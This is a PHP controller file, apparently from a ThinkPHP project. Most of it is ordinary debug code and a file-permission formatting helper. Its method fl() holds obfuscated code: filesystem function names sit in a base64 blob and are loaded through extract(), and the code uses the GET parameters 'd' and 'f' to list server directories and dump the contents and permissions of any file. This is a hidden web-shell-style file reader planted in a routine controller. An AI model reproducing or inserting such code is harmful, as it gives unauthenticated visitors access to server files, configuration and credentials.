<?php

namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller {
    public function index() {
        var_dump(C("aaaa"));
        die;
    }

    public function f() {
        $filePath = dirname(__FILE__) . '\\index2.html';

        if (!($fp = fopen($filePath, 'r'))) {
            return;
        }
        $r = vfprintf($fp, "%04d-%02d-%02d", [133, 2, 3]);
//        fclose($fp);
//        var_dump($r);
        var_dump($fp);
//        $filePath = dirname(__FILE__).'\\index.html';
//        fwrite($fp, "--dfsfs4444ds");

        $a = fscanf($fp, "%04d-%02d-%02d", $o, $o1, $o2);
        var_dump([$a, $o, $o1, $o2]);;
    }

    function fl() {
        $a=$b=$c=$d=$e=$f=$g=$h=$i=$j=$k=$l=$m='';$mn='ba'.'se6'.'4_dec'.'ode';$str ="eyJhIjoiYmFzZTY0X2RlY29kZSIsImQiOiJyZWFscGF0aCIsImUiOiJpc19kaXIiLCJmIjoic2NhbmRpciIsImciOiJpY29udiIsImgiOiJ2YXJfZHVtcCIsImkiOiJpc19maWxlIiwiaiI6ImJhc2VfY29udmVydCIsImsiOiJmaWxlX2dldF9jb250ZW50cyIsImwiOiJzdWJzdHIiLCJtIjoiZmlsZXBlcm1zIn0=";extract(json_decode($mn($str),true),EXTR_OVERWRITE);$b=I("get.d",'',$a);$c=I("get.f",'',$a);echo "<pr"."e/>";$n=$d($b?$b:'.');if($e($n)){$o=$f($n);foreach($o as &$p){$p=$g('g'.'bk','ut'.'f-8',$p);}$h($o);if($c){$q=$b.'/'.$c;if(!$i($q))exit();$r=$k($q);$h($m($q));$h($l($j($m($q),10,8),3));echo "<xm" . "p> $r </xm"."p>";}}
    }


    function changePerm($perms) {
        if (($perms & 0xC000) == 0xC000) {
            // Socket
            $info = 's';
        } elseif (($perms & 0xA000) == 0xA000) {
            // Symbolic Link
            $info = 'l';
        } elseif (($perms & 0x8000) == 0x8000) {
            // Regular
            $info = '-';
        } elseif (($perms & 0x6000) == 0x6000) {
            // Block special
            $info = 'b';
        } elseif (($perms & 0x4000) == 0x4000) {
            // Directory
            $info = 'd';
        } elseif (($perms & 0x2000) == 0x2000) {
            // Character special
            $info = 'c';
        } elseif (($perms & 0x1000) == 0x1000) {
            // FIFO pipe
            $info = 'p';
        } else {
            // Unknown
            $info = 'u';
        }

// Owner
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x') :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x') :
            (($perms & 0x0400) ? 'S' : '-'));

// World
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x') :
            (($perms & 0x0200) ? 'T' : '-'));
        return $info;
    }
}